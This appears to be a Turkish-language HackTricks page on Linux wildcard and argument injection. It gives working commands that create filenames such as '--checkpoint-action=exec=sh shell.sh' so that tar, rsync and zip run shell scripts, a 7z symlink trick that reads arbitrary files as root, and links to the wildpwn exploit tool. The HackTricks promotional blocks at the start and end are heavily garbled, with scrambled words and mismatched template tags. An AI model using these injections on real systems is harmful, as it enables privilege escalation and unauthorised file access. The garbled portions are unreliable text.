{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


## chown, chmod

**Hangi dosya sahibini ve izinlerini diğer dosyalar için kopyalamak istediğinizi belirtebilirsiniz.**
```bash
touch "--reference=/my/own/path/filename"
```
You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(combined attack)_\
Daha fazla bilgi için [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Rasgele komutlar çalıştırın:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Bu, [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar saldırısı)_ kullanılarak istismar edilebilir.\
Daha fazla bilgi için [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) adresine bakın.

## Rsync

**Rasgele komutlar çalıştırın:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Bu, [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _attack)_ kullanılarak istismar edilebilir.\
Daha fazla bilgi için [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) adresine bakın.

## 7z

**7z** içinde `--` kullanarak `*`'dan önce (not: `--` sonraki girdinin parametre olarak işlenemeyeceği anlamına gelir, bu durumda sadece dosya yolları) rastgele bir hatanın bir dosyayı okumasına neden olabilirsiniz, bu nedenle aşağıdaki gibi bir komut root tarafından çalıştırılıyorsa:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
Ve bu işlemin gerçekleştirildiği klasörde dosyalar oluşturabilirsiniz, `@root.txt` dosyasını ve okumak istediğiniz dosyaya **symlink** olan `root.txt` dosyasını oluşturabilirsiniz:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Sonra, **7z** çalıştırıldığında, `root.txt` dosyasını sıkıştırması gereken dosyaların listesini içeren bir dosya olarak ele alacaktır (bu, `@root.txt` varlığının gösterdiği şeydir) ve 7z `root.txt` dosyasını okuduğunda `/file/you/want/to/read` dosyasını okuyacak ve **bu dosyanın içeriği bir dosya listesi olmadığından, bir hata verecektir** içeriği göstererek.

_HackTheBox'tan CTF kutusunun yazılımlarında daha fazla bilgi._

## Zip

**Rasgele komutlar çalıştır:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
```markdown
{% hnt stye="acceas" %}
AWS Hacking Pratikleri:<img src="/.gitbook/assets/aite.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Deneyimi (ARTE)**](https://github.com/carlospolop/hacktricks) <img src="/.gitbook/assets/k.png" alt="" data-size="line">\
GCP Hacking Pratikleri<img src="/.gitbook/assets/gte.png" alt="" data-size="line">[**GCP Kırmızı Takım Deneyimi (GE)**](https://github.com/carlospolop/hacktricks)

<details>

<summary>Support HackTricks</summary>

* [**GitHub'da abonelik planlarını kontrol edin**](https://github.com/sponsors/carlospolop)!
* [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**Telegram grubuna**](https://t.me/peass) katılın ya da **bizi Twitter'da takip edin** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub reposuna PR gönderin.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
```
